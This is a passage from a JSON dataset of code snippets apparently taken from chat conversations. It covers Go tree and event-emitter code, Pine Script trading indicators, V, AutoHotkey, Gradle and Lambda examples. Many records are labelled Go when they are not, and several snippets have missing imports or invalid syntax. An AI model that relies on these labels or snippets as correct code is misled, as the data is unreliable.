    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n)\n\n// 定义节点结构体\ntype Node struct {\n\tName     string            `json:\"name\"`     // 节点名称\n\tChildren map[string]*Node `json:\"children\"` // 子节点\n}\n\n// 将路径解析为树形结构\nfunc parsePathToTree(path string, root *Node) {\n\t// 按照“/”分割路径字符串\n\tparts := strings.Split(path, \"/\")\n\n\t// 遍历路径中的每一部分字符串，将其加入树形结构\n\tcurrNode := root\n\tfor _, part := range parts {\n\t\tif part == \"\" {\n\t\t\tcontinue\n\t\t}\n\t\t// 如果当前节点的子节点中已经有该部分字符串，则直接进入该子节点\n\t\tif child, ok := currNode.Children[part]; ok {\n\t\t\tcurrNode = child\n\t\t} else {\n\t\t\t// 否则，新建子节点并加入当前节点的子节点中\n\t\t\tchild := &Node{\n\t\t\t\tName:     part,\n\t\t\t\tChildren: make(map[string]*Node),\n\t\t\t}\n\t\t\tcurrNode.Children[part] = child\n\t\t\tcurrNode = child\n\t\t}\n\t}\n}\n\n// 打印树形结构\nfunc printTree(node *Node, prefix string) {\n\tfmt.Println(prefix, \"+\", node.Name)\n\tfor _, child := range node.Children {\n\t\tprintTree(child, prefix+\" \")\n\t}\n}\n\n// 将树形结构转换为JSON字符串\nfunc convertTreeToJSON(node *Node) (string, error) {\n\tdata, err := json.MarshalIndent(node, \"\", \"  \")\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\treturn string(data), nil\n}\n\nfunc main() {\n\t// 初始化根节点\n\troot := &Node{\n\t\tName:     \"\",\n\t\tChildren: make(map[string]*Node),\n\t}\n\n\t// 解析路径字符串并加入树形结构\n\tparsePathToTree(\"/a\", root)\n\tparsePathToTree(\"/a/fileA\", root)\n\tparsePathToTree(\"/folder/fileB\", root)\n\n\t// 打印树形结构\n\tprintTree(root, \"\")\n\n\t// 将树形结构转换为JSON字符串\n\tjsonStr, err := convertTreeToJSON(root)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\tfmt.Println(jsonStr)\n}",
    "filename": "dd1086dde896c7181b3a6a0ffe45db49_0.go"
  },
  {
    "conversation_hash": "2ec8e1670ed37b1ae5be1082b6c5409a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "tx := db.Begin()\ndefer func() {\n    if r := recover(); r != nil {\n        tx.Rollback()\n    }\n}()\n\n// Call the API\nres, err := http.Get(\"https://api.example.com/\")\nif err != nil {\n    tx.Rollback()\n    return err\n}\ndefer res.Body.Close()\n\n// Mark the field in the database as called\nobj := &MyObject{ID: 1}\nif err := tx.Model(obj).Update(\"api_called\", true).Error; err != nil {\n    tx.Rollback()\n    return err\n}\n\ntx.Commit()",
    "filename": "2ec8e1670ed37b1ae5be1082b6c5409a_0.go"
  },
  {
    "conversation_hash": "2ec8e1670ed37b1ae5be1082b6c5409a",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "// Update the field in the database first\nobj := &MyObject{ID: 1}\nif err := db.Model(obj).Update(\"api_called\", true).Error; err != nil {\n    return err\n}\n\n// Call the API\nres, err := http.Get(\"https://api.example.com/\")\nif err != nil {\n    // Log the error and retry the call at a later time\n    log.Printf(\"API call failed: %v\", err)\n    return err\n}\ndefer res.Body.Close()\n\n// Process the API response\n// ...",
    "filename": "2ec8e1670ed37b1ae5be1082b6c5409a_1.go"
  },
  {
    "conversation_hash": "2ec8e1670ed37b1ae5be1082b6c5409a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "tx := db.Begin()\ndefer func() {\n    if r := recover(); r != nil {\n        tx.Rollback()\n    }\n}()\n\n// Update the field in the database\nobj := &MyObject{ID: 1}\nif err := tx.Model(obj).Update(\"paid_at\", time.Now()).Error; err != nil {\n    tx.Rollback()\n    return err\n}\n\n// Call the API\nres, err := http.Get(\"https://api.example.com/\")\nif err != nil {\n    tx.Rollback()\n    return err\n}\ndefer res.Body.Close()\n\n// Process the API response\n// ...\n\ntx.Commit()",
    "filename": "2ec8e1670ed37b1ae5be1082b6c5409a_2.go"
  },
  {
    "conversation_hash": "6c2c4cb24257d692df1046d856b8e329",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Previous Week Bias\", overlay=true)\n\nvar line prevWeekHighLabel = line.new(na, na, na, na)\nvar line prevWeekLowLabel = line.new(na, na, na, na)\nvar line buySignalLine = line.new(na, na, na, na)\nvar line sellSignalLine = line.new(na, na, na, na)\n\nvar label buyLabel = label.new(na, na, \"Buy Bias\")\nvar label sellLabel = label.new(na, na, \"Sell Bias\")\n\nvar bool lines_plotted = false\n\nif change(time(\"W\")) and not lines_plotted\n    line.set_xy1(prevWeekHighLabel, bar_index[1], request.security(syminfo.tickerid, \"W\", high[1]))\n    line.set_xy2(prevWeekHighLabel, bar_index[1] + 5, request.security(syminfo.tickerid, \"W\", high[1]))\n    line.set_xy1(prevWeekLowLabel, bar_index[1], request.security(syminfo.tickerid, \"W\", low[1]))\n    line.set_xy2(prevWeekLowLabel, bar_index[1] + 5, request.security(syminfo.tickerid, \"W\", low[1]))\n\n    label.set_xy(buyLabel, bar_index[1] + 5, request.security(syminfo.tickerid, \"W\", high[1]))\n    label.set_xy(sellLabel, bar_index[1] + 5, request.security(syminfo.tickerid, \"W\", low[1]))\n\n    line.set_color(prevWeekHighLabel, change(time(\"W\")) ? color.blue : na)\n    line.set_color(prevWeekLowLabel, change(time(\"W\")) ? color.red : na)\n    label.set_color(buyLabel, change(time(\"W\")) ? color.green : na)\n    label.set_color(sellLabel, change(time(\"W\")) ? color.red : na)\n    \n    lines_plotted := true\nelse\n    lines_plotted := false",
    "filename": "6c2c4cb24257d692df1046d856b8e329_0.go"
  },
  {
    "conversation_hash": "f88f48910e893b3e0b79cdffa6122d3a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nindicator(\"Previous Week Bias\", overlay=true, max_labels_count=1, max_lines_count=1)\n\nvar line prevWeekHighLabel = na\nvar line prevWeekLowLabel = na\nvar line buySignalLine = na\nvar line sellSignalLine = na\nvar line buy00Line = na\nvar line sell00Line = na\nvar line buy007Line = na\nvar line sell007Line = na\nvar label buy007Label = na\nvar label sell007Label = na\n\nvar float prevMonthHigh = na\nvar float prevMonthLow = na\nvar float fiftyPercent = na\nvar float highestHigh = na\nvar float lowestLow = na\nvar bool buyBiasConfirmed = na\nvar bool sellBiasConfirmed = na\nvar bool redCandleClosed = na\nvar bool greenCandleClosed = na\nvar float buy00Price = na\nvar float sell00Price = na\n\nprevMonthHigh := request.security(syminfo.tickerid, \"M\", high[1])\nprevMonthLow := request.security(syminfo.tickerid, \"M\", low[1])\nfiftyPercent := (prevMonthHigh + prevMonthLow) / 2\nprevWeekCloseHigh = request.security(syminfo.tickerid, \"W\", high[1])\nprevWeekCloseLow = request.security(syminfo.tickerid, \"W\", low[1])\nprevWeekClose = request.security(syminfo.tickerid, \"W\", close[1])\n\nif ta.change(time(\"W\")) > 0\n    line.delete(prevWeekHighLabel)\n    line.delete(prevWeekLowLabel)\n    line.delete(buySignalLine)\n    line.delete(sellSignalLine)\n    line.delete(buy00Line)\n    line.delete(sell00Line)\n    line.delete(buy007Line)\n    line.delete(sell007Line)\n    label.delete(buy007Label)\n    label.delete(sell007Label)\n\n    if prevWeekClose > fiftyPercent\n        prevWeekHighLabel := line.new(x1=bar_index[1], y1=prevWeekCloseHigh, x2=bar_index+4, y2=prevWeekCloseHigh, color=color.blue, width=1, style=line.style_solid)\n        label.new(x=bar_index, y=prevWeekCloseHigh, text=\"Buy Bias\", color=color.green, style=label.style_text_outline, size=size.small)\n        buyBiasConfirmed := true\n    else if prevWeekClose < fiftyPercent\n        prevWeekLowLabel := line.new(x1=bar_index[1], y1=prevWeekCloseLow, x2=bar_index+4, y2=prevWeekCloseLow, color=color.blue, width=1, style=line.style_solid)\n        label.new(x=bar_index, y=prevWeekCloseLow, text=\"Sell Bias\", color=color.red, style=label.style_text_outline, size=size.small)\n        sellBiasConfirmed := true\n\n// Buy bias logic\nif buyBiasConfirmed\n    if (close) > prevWeekCloseHigh\n        highestHigh := buy00Price\n    else if high > buy00Price\n        highestHigh := buy00Price\n    else if (close) < open\n        redCandleClosed := true\n    else if redCandleClosed and not na(buy00Price)\n        buy007Line := line.new(x1=bar_index, y1=buy00Price, x2=bar_index+4, y2=buy00Price, color=color.rgb(0, 21, 249), width=1, style=line.style_solid)\n        label.new(x=bar_index, y=buy00Price, text=\"Buy 00=7\", color=color.green, style=label.style_text_outline, size=size.small)\n        redCandleClosed := na\n\n// Sell bias logic\nif sellBiasConfirmed\n    if (close) < prevWeekCloseLow \n        sell00Price := low\n    else if low < sell00Price\n        sell00Price := low\n    else if (close) > open\n        greenCandleClosed := true\n    else if greenCandleClosed and not na(sell00Price)\n        sell007Line := line.new(x1=bar_index, y1=sell00Price, x2=bar_index+4, y2=sell00Price, color=color.rgb(10, 36, 205), width=1, style=line.style_solid)\n        label.new(x=bar_index, y=sell00Price, text=\"Sell 00=7\", color=color.red, style=label.style_text_outline, size=size.small)\n        greenCandleClosed := na\n\nif ta.change(time(\"W\")) > 0\n    line.delete(prevWeekHighLabel)\n    line.delete(prevWeekLowLabel)\n    line.delete(buySignalLine)\n    line.delete(sellSignalLine)\n    line.delete(buy00Line)\n    line.delete(sell00Line)\n    line.delete(buy007Line)\n    line.delete(sell007Line)\n    label.delete(buy007Label)\n    label.delete(sell007Label)",
    "filename": "f88f48910e893b3e0b79cdffa6122d3a_0.go"
  },
  {
    "conversation_hash": "62c58c204f323543629b5ebb81722d75",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nindicator(\"007 Bias Indicator\", shorttitle=\"007\", overlay=true)\n\nprevWeekHigh = request.security(syminfo.tickerid, \"W\", high[1])\nprevWeekLow = request.security(syminfo.tickerid, \"W\", low[1])\nprevWeekClose = request.security(syminfo.tickerid, \"W\", close[1])\nprevMonth50 = (request.security(syminfo.tickerid, \"M\", high[1]) +\n                request.security(syminfo.tickerid, \"M\", low[1])) / 2\n\nbuyBias = prevWeekClose > prevMonth50\nsellBias = prevWeekClose < prevMonth50\n\nvar line buyLine = line.new(na,na,na,na)\nvar line sellLine = line.new(na,na,na,na)\nvar bool flagExists = false\n\nif barstate.isfirst\n    line.set_extend(buyLine, extend.none)\n    line.set_extend(sellLine, extend.none)\n    line.set_width(buyLine, 1)\n    line.set_width(sellLine, 1)\n    line.set_color(buyLine, color.blue)\n    line.set_color(sellLine, color.blue)\n\nif not flagExists\n    if buyBias and close > prevWeekHigh\n        line.set_xy1(buyLine, bar_index[1], high)\n        line.set_xy2(buyLine, bar_index, high)\n        line.set_text(buyLine, \"007 Buy\")\n        flagExists := true\n    else if sellBias and close < prevWeekLow\n        line.set_xy1(sellLine, bar_index[1], low)\n        line.set_xy2(sellLine, bar_index, low)\n        line.set_text(sellLine, \"007 Sell\")\n        flagExists := true\n\nif barstate.islast or (buyBias and not sellBias and dayofweek[1] == 1) or (not buyBias and sellBias and dayofweek[1] == 1)\n    if buyBias\n        line.delete(buyLine)\n    if sellBias\n        line.delete(sellLine)\n    flagExists := false",
    "filename": "62c58c204f323543629b5ebb81722d75_0.go"
  },
  {
    "conversation_hash": "96d76965039385a834aff10a4c1e636f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n)\n\ntype eventKey string\n\n// EventEmitter - структура нашего event emitter\ntype EventEmitter struct {\n\tsync.RWMutex\n\tevents map[eventKey][]chan interface{}\n}\n\nfunc newEventEmitter() *EventEmitter {\n\treturn &EventEmitter{\n\t\tevents: make(map[eventKey][]chan interface{}),\n\t}\n}\n\nfunc (e *EventEmitter) subscribe(event string, ch chan interface{}) {\n\te.Lock()\n\tdefer e.Unlock()\n\teventKey := eventKey(event)\n\te.events[eventKey] = append(e.events[eventKey], ch)\n}\n\nfunc (e *EventEmitter) emit(event string, data interface{}) {\n\te.RLock()\n\tdefer e.RUnlock()\n\tlisteners, ok := e.events[eventKey(event)]\n\tif ok {\n\t\tfor _, ch := range listeners {\n\t\t\tch <- data\n\t\t}\n\t}\n}\n\nfunc (e *EventEmitter) unsubscribe(event string, ch chan interface{}) {\n\te.Lock()\n\tdefer e.Unlock()\n\teventKey := eventKey(event)\n\tif listeners, ok := e.events[eventKey]; ok {\n\t\tfor i := 0; i < len(listeners); {\n\t\t\tif listeners[i] == ch {\n\t\t\t\tlisteners[i] = listeners[len(listeners)-1]\n\t\t\t\tlisteners = listeners[:len(listeners)-1]\n\t\t\t} else {\n\t\t\t\ti++\n\t\t\t}\n\t\t}\n\t\te.events[eventKey] = listeners\n\t}\n}\n\nfunc main() {\n\temitter := newEventEmitter()\n\n\tch1 := make(chan interface{}, 1)\n\temitter.subscribe(\"event1\", ch1)\n\n\tch2 := make(chan interface{}, 1)\n\temitter.subscribe(\"event1\", ch2)\n\n\temitter.emit(\"event1\", \"Hello, world!\")\n\n\tfmt.Printf(\"ch1: %v\\n\", <-ch1)\n\tfmt.Printf(\"ch2: %v\\n\", <-ch2)\n\n\temitter.unsubscribe(\"event1\", ch1)\n\temitter.emit(\"event1\", \"Hello, again!\")\n\n\tselect {\n\tcase data := <-ch1:\n\t\tfmt.Printf(\"ch1 should be unsubscribed: %v\\n\", data)\n\tdefault:\n\t\tfmt.Println(\"ch1 is unsubscribed\")\n\t}\n\n\tfmt.Printf(\"ch2: %v\\n\", <-ch2)\n}",
    "filename": "96d76965039385a834aff10a4c1e636f_0.go"
  },
  {
    "conversation_hash": "96d76965039385a834aff10a4c1e636f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n)\n\ntype eventKey string\n\ntype EventListener func(data interface{})\n\ntype EventEmitter struct {\n\tsync.Mutex\n\tevents map[eventKey]([]EventListener)\n}\n\nfunc NewEventEmitter() *EventEmitter {\n\treturn &EventEmitter{\n\t\tevents: make(map[eventKey]([]EventListener)),\n\t}\n}\n\nfunc (e *EventEmitter) Subscribe(event string, listener EventListener) {\n\te.Lock()\n\tdefer e.Unlock()\n\n\teventKey := eventKey(event)\n\tlisteners := e.events[eventKey]\n\tlisteners = append(listeners, listener)\n\te.events[eventKey] = listeners\n}\n\nfunc (e *EventEmitter) Emit(event string, data interface{}) {\n\te.Lock()\n\tdefer e.Unlock()\n\n\teventKey := eventKey(event)\n\tif listeners, ok := e.events[eventKey]; ok {\n\t\tfor _, listener := range listeners {\n\t\t\tlistener(data)\n\t\t}\n\t}\n}\n\nfunc main() {\n\temitter := NewEventEmitter()\n\n\tlistener1 := func(data interface{}) {\n\t\tfmt.Printf(\"Listener1: %v\\n\", data)\n\t}\n\n\tlistener2 := func(data interface{}) {\n\t\tfmt.Printf(\"Listener2: %v\\n\", data)\n\t}\n\n\temitter.Subscribe(\"event1\", listener1)\n\temitter.Subscribe(\"event1\", listener2)\n\n\temitter.Emit(\"event1\", \"Hello, world!\")\n}",
    "filename": "96d76965039385a834aff10a4c1e636f_1.go"
  },
  {
    "conversation_hash": "96d76965039385a834aff10a4c1e636f",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n)\n\nconst numPriorities = 6\n\ntype eventKey string\n\ntype EventListener func(data interface{})\n\ntype EventEmitter struct {\n\tsync.Mutex\n\tevents map[eventKey]([]EventListener)\n}\n\nfunc NewEventEmitter() *EventEmitter {\n\treturn &EventEmitter{\n\t\tevents: make(map[eventKey]([]EventListener)),\n\t}\n}\n\nfunc (e *EventEmitter) Subscribe(event string, listener EventListener) {\n\te.Lock()\n\tdefer e.Unlock()\n\n\teventKey := eventKey(event)\n\tlisteners := e.events[eventKey]\n\tlisteners = append(listeners, listener)\n\te.events[eventKey] = listeners\n}\n\nfunc (e *EventEmitter) Emit(event string, data interface{}, priority int) {\n\te.Lock()\n\tdefer e.Unlock()\n\n\teventKey := eventKey(event)\n\tif listeners, ok := e.events[eventKey]; ok {\n\t\tpriorityQueue.add(priority, func() {\n\t\t\tfor _, listener := range listeners {\n\t\t\t\tlistener(data)\n\t\t\t}\n\t\t})\n\t}\n}\n\ntype PriorityQueue struct {\n\tsync.Mutex\n\tqueues [numPriorities]chan func()\n}\n\nvar priorityQueue = newPriorityQueue()\n\nfunc newPriorityQueue() *PriorityQueue {\n\tpq := &PriorityQueue{}\n\tfor i := 0; i < numPriorities; i++ {\n\t\tpq.queues[i] = make(chan func(), 100)\n\t\tgo func(queueIdx int) {\n\t\t\tfor task := range pq.queues[queueIdx] {\n\t\t\t\ttask()\n\t\t\t}\n\t\t}(i)\n\t}\n\treturn pq\n}\n\nfunc (pq *PriorityQueue) add(priority int, task func()) {\n\tif priority < 0 {\n\t\tpriority = 0\n\t} else if priority >= numPriorities {\n\t\tpriority = numPriorities - 1\n\t}\n\tpq.Lock()\n\tpq.queues[priority] <- task\n\tpq.Unlock()\n}\n\nfunc main() {\n\temitter := NewEventEmitter()\n\n\tlistener1 := func(data interface{}) {\n\t\tfmt.Printf(\"Listener1: %v\\n\", data)\n\t}\n\n\tlistener2 := func(data interface{}) {\n\t\tfmt.Printf(\"Listener2: %v\\n\", data)\n\t}\n\n\temitter.Subscribe(\"event1\", listener1)\n\temitter.Subscribe(\"event1\", listener2)\n\n\temitter.Emit(\"event1\", \"Hello, world! Priority 1\", 1)\n\temitter.Emit(\"event1\", \"Hello, world! Priority 2\", 2)\n\n\t// Дать время горутинам обработать события\n\ttime.Sleep(time.Second)\n}",
    "filename": "96d76965039385a834aff10a4c1e636f_2.go"
  },
  {
    "conversation_hash": "96d76965039385a834aff10a4c1e636f",
    "code_index": 3,
    "language": "Go",
    "libraries": [
      "sync",
      "time"
    ],
    "code": "import sync\nimport time\n\nconst (\n\tnum_priorities = 6\n)\n\ntype EventKey = string\n\ntype EventListener = fn (data voidptr)\n\nstruct EventEmitter {\n\tmut sync.RwMutex\n\tevents map[EventKey][]EventListener\n}\n\nfn new_emitter() EventEmitter {\n\treturn EventEmitter{ events: {} }\n}\n\nfn (mut e EventEmitter) subscribe(event string, listener EventListener) {\n\te.mut.lock()\n\tdefer e.mut.unlock()\n\n\tkey := event\n\n\tif e.events[key].len == 0 {\n\t\te.events[key] = []EventListener{}\n\t}\n\n\te.events[key] << listener\n}\n\nfn (e EventEmitter) emit(event string, data voidptr, priority int) {\n\te.mut.lock_shared()\n\tdefer e.mut.unlock_shared()\n\n\tkey := event\n\tlisteners := e.events[key] or { [] }\n\tpriority_queue.add(priority, fn { \n\t\tfor listener in listeners {\n\t\t\tlistener(data)\n\t\t}\n\t})\n}\n\nstruct PriorityQueue {\nqueues [num_priorities][]fn()\n}\n\nfn new_priority_queue() PriorityQueue {\n\tmut pq := PriorityQueue{}\n\tfor i := 0; i < num_priorities; i++ {\n\t\tpq.queues[i] = []fn()\n\t}\n\treturn pq\n}\n\nfn (mut pq PriorityQueue) add(priority int, task fn()) {\n\tif priority < 0 {\n\t\tpriority = 0\n\t} else if priority >= num_priorities {\n\t\tpriority = num_priorities - 1\n\t}\n\tpq.queues[priority] << task\n}\n\nstatic mut priority_queue := new_priority_queue()\n\nfn listener1(data voidptr) {\n\tstr := *data as string\n\tprintln('Listener1: $str')\n}\n\nfn listener2(data voidptr) {\n\tstr := *data as string\n\tprintln('Listener2: $str')\n}\n\nfn main() {\n\tmut emitter := new_emitter()\n\n\temitter.subscribe('event1', listener1)\n\temitter.subscribe('event1', listener2)\n\n\tmut hello1 := 'Hello, world! Priority 1'\n\temitter.emit('event1', &hello1, 1)\n\tmut hello2 := 'Hello, world! Priority 2'\n\temitter.emit('event1', &hello2, 2)\n\n\ttime.sleep(1 * time.second)\n}",
    "filename": "96d76965039385a834aff10a4c1e636f_3.go"
  },
  {
    "conversation_hash": "3a47556ac9538ab8af0d482923e13628",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "time"
    ],
    "code": "import time\n\nconst (\n    num_priorities = 6\n)\n\ntype EventKey = string\n\ntype EventListener = fn(data ?data_ptr)\n\ntype data_ptr = ?\n\nstruct EventEmitter {\n    mut: sync.RwMutex\n    events: map[EventKey][]EventListener\n}\n\nfn new_emitter() EventEmitter {\n    return EventEmitter{ events: {} }\n}\n\nfn (mut e EventEmitter) subscribe(event string, listener EventListener) {\n    e.mut.lock()\n    defer e.mut.unlock()\n\n    key := event\n\n    if e.events[key].len == 0 {\n        e.events[key] = []EventListener{}\n    }\n\n    e.events[key] << listener\n}\n\nfn (e EventEmitter) emit(event string, data ?data_ptr, priority int) {\n    e.mut.lock_shared()\n    defer e.mut.unlock_shared()\n\n    key := event\n    listeners := e.events[key] or { [] }\n    priority_queue.add(priority, fn { \n        for listener in listeners {\n            listener(data)\n        }\n    })\n}\n\nstruct PriorityQueue {\n    queues: [num_priorities][]fn()\n}\n\nfn new_priority_queue() PriorityQueue {\n    mut pq := PriorityQueue{}\n    for i := 0; i < num_priorities; i++ {\n        pq.queues[i] = []fn()\n    }\n    return pq\n}\n\nfn (mut pq PriorityQueue) add(priority int, task fn()) {\n    if priority < 0 {\n        priority = 0\n    } else if priority >= num_priorities {\n        priority = num_priorities - 1\n    }\n    pq.queues[priority] << task\n}\n\nstatic mut priority_queue := new_priority_queue()\n\nfn listener1(data ?data_ptr) {\n    if let Some(str) = data.? as string {\n        println(\"Listener1: \" + str)\n    }\n}\n\nfn listener2(data ?data_ptr) {\n    if let Some(str) = data.? as string {\n        println(\"Listener2: \" + str)\n    }\n}\n\nfn main() {\n    mut emitter := new_emitter()\n\n    emitter.subscribe(\"event1\", listener1)\n    emitter.subscribe(\"event1\", listener2)\n\n    mut hello1 := \"Hello, world! Priority 1\"\n    emitter.emit(\"event1\", &hello1, 1)\n    mut hello2 := \"Hello, world! Priority 2\"\n    emitter.emit(\"event1\", &hello2, 2)\n\n    time.sleep(1 * time.second)\n}",
    "filename": "3a47556ac9538ab8af0d482923e13628_0.go"
  },
  {
    "conversation_hash": "f0109a566bb4a484b22d3f79598eb260",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "#Include <WinAPI.au3>\n\nProcess, Exist, ProgramName.exe ;检查进程是否正在运行\nIf ErrorLevel ;如果正在运行，则最大化\n{\n    hWnd := WinGetHandle(\"ahk_pid\" . ErrorLevel)\n    DllCall(\"ShowWindow\", \"Ptr\", hWnd, \"Int\", SW_MAXIMIZE)\n}",
    "filename": "f0109a566bb4a484b22d3f79598eb260_2.go"
  },
  {
    "conversation_hash": "7ab8761e4e206fdf226b57d0e711a153",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "pkgname=example\npkgver=1.0\npkgrel=1\npkgdesc=\"An example package\"\narch=('any')\nurl=\"https://example.com\"\nlicense=('GPL')\ndepends=('dependency1' 'dependency2' 'dependency3>=2.0')\nsource=(\"https://example.com/downloads/${pkgname}-${pkgver}.tar.gz\")\nmd5sums=('md5sum_of_package')\n\nbuild() {\n  cd \"$srcdir/$pkgname-$pkgver\"\n  ./configure --prefix=/usr\n  make\n}\n\npackage() {\n  cd \"$srcdir/$pkgname-$pkgver\"\n  make DESTDIR=\"$pkgdir\" install\n}",
    "filename": "7ab8761e4e206fdf226b57d0e711a153_1.go"
  },
  {
    "conversation_hash": "8d5d1f19258bd056d8da2fbf78399f0b",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "{\n  \"products\": [\n    {\n      \"id\": 1,\n      \"name\": \"Product 1\",\n      \"price\": 10,\n      \"image\": \"https://picsum.photos/200\",\n      \"description\": \"Lorem ipsum dolor sit amet, consectetur adipiscing elit...\"\n    },\n    {\n      \"id\": 2,\n      \"name\": \"Product 2\",\n      \"price\": 20,\n      \"image\": \"https://picsum.photos/200\",\n      \"description\": \"Lorem ipsum dolor sit amet, consectetur adipiscing elit...\"\n    },\n    {\n      \"id\": 3,\n      \"name\": \"Product 3\",\n      \"price\": 30,\n      \"image\": \"https://picsum.photos/200\",\n      \"description\": \"Lorem ipsum dolor sit amet, consectetur adipiscing elit...\"\n    }\n  ]\n}",
    "filename": "8d5d1f19258bd056d8da2fbf78399f0b_3.go"
  },
  {
    "conversation_hash": "665a6ce8ba8bfd429764e3ff8a998aac",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    compileSdkVersion 30\n    buildToolsVersion \"30.0.2\"\n    defaultConfig {\n        ...\n    }\n    sourceSets {\n        main {\n            jniLibs.srcDirs = ['libs']    // 指定so文件所在目录\n        }\n    }\n    ...\n}",
    "filename": "665a6ce8ba8bfd429764e3ff8a998aac_0.go"
  },
  {
    "conversation_hash": "665a6ce8ba8bfd429764e3ff8a998aac",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    defaultConfig {\n        ...\n        ndk {\n            //移除 ndk 配置\n        }\n    }\n    sourceSets {\n        main {\n            jniLibs.srcDirs = ['libs']\n        }\n    }\n    externalNativeBuild {\n        //移除 externalNativeBuild 配置\n    }\n}",
    "filename": "665a6ce8ba8bfd429764e3ff8a998aac_1.go"
  },
  {
    "conversation_hash": "2e8f8820a6f4e46a5f2454e4786286ae",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    sourceSets {\n        main {\n            jniLibs.srcDirs = ['libs']\n        }\n    }\n}",
    "filename": "2e8f8820a6f4e46a5f2454e4786286ae_0.go"
  },
  {
    "conversation_hash": "2e8f8820a6f4e46a5f2454e4786286ae",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    // ...\n    externalNativeBuild {\n        cmake {\n            path \"CMakeLists.txt\"\n            version \"3.10.2\"\n            // 指定构建参数\n            arguments \"-DANDROID_PLATFORM=android-21\", \"-DANDROID_TOOLCHAIN=clang\"\n        }\n    }\n}",
    "filename": "2e8f8820a6f4e46a5f2454e4786286ae_2.go"
  },
  {
    "conversation_hash": "2e8f8820a6f4e46a5f2454e4786286ae",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    // ...\n    externalNativeBuild {\n        ndkBuild {\n            path 'jni/Android.mk'\n            // 指定构建参数\n            arguments 'NDK_DEBUG=1', '-j4'\n        }\n    }\n}",
    "filename": "2e8f8820a6f4e46a5f2454e4786286ae_3.go"
  },
  {
    "conversation_hash": "2e8f8820a6f4e46a5f2454e4786286ae",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    // ...\n    productFlavors {\n        myFlavor {\n            // 定义可执行程序的图标\n            applicationIcon \"@mipmap/ic_launcher\"\n        }\n    }\n}",
    "filename": "2e8f8820a6f4e46a5f2454e4786286ae_4.go"
  },
  {
    "conversation_hash": "02f78cf2e5d382238302f04de02e14bf",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\n\t\"github.com/aws/aws-lambda-go/events\"\n\t\"github.com/aws/aws-lambda-go/lambda\"\n)\n\nfunc handler(ctx context.Context, request events.APIGatewayProxyRequest) (*events.APIGatewayProxyResponse, error) {\n\tfmt.Println(\"Request:\", request)\n\treturn &events.APIGatewayProxyResponse{\n\t\tStatusCode: 200,\n\t\tBody:       \"Hello, World!\",\n\t}, nil\n}\n\nfunc main() {\n\tlambda.Start(handler)\n}",
    "filename": "02f78cf2e5d382238302f04de02e14bf_0.go"
  },
  {
    "conversation_hash": "02f78cf2e5d382238302f04de02e14bf",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"encoding/json\"\n\t\"fmt\"\n\n\t\"github.com/aws/aws-lambda-go/events\"\n\t\"github.com/aws/aws-lambda-go/lambda\"\n)\n\ntype CustomObject struct {\n\tName    string `json:\"name\"`\n\tMessage string `json:\"message\"`\n}\n\nfunc handler(ctx context.Context, request events.APIGatewayProxyRequest) (*events.APIGatewayProxyResponse, error) {\n\tvar customObject CustomObject\n\terr := json.Unmarshal([]byte(request.Body), &customObject)\n\tif err != nil {\n\t\treturn &events.APIGatewayProxyResponse{\n\t\t\tStatusCode: 400,\n\t\t\tBody:       \"Invalid request body\",\n\t\t}, nil\n\t}\n\n\tfmt.Println(\"Name:\", customObject.Name)\n\tfmt.Println(\"Message:\", customObject.Message)\n\n\treturn &events.APIGatewayProxyResponse{\n\t\tStatusCode: 200,\n\t\tBody:       \"Request successful!\",\n\t}, nil\n}\n\nfunc main() {\n\tlambda.Start(handler)\n}",
    "filename": "02f78cf2e5d382238302f04de02e14bf_1.go"
  },
  {
    "conversation_hash": "d004764b8e76726dbc485079fef6c777",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "pub mod datacode {\n    pub struct MyGlobalStruct {\n        // ...\n    }\n\n    // Other code for datacode module\n}",
    "filename": "d004764b8e76726dbc485079fef6c777_8.go"
  },
  {
    "conversation_hash": "ab9efa6da5f6d4aa046ece220c78c950",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "repositories {\n    mavenCentral()\n}\n\ndependencies {\n    testImplementation \"org.jetbrains.kotlinx:lincheck:2.13\"\n    testImplementation \"org.jetbrains.kotlinx:lincheck-junit5:2.13\"\n}",
    "filename": "ab9efa6da5f6d4aa046ece220c78c950_0.go"
  },
  {
    "conversation_hash": "1e4e6912a8f682051e7685d61c6dc4bf",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
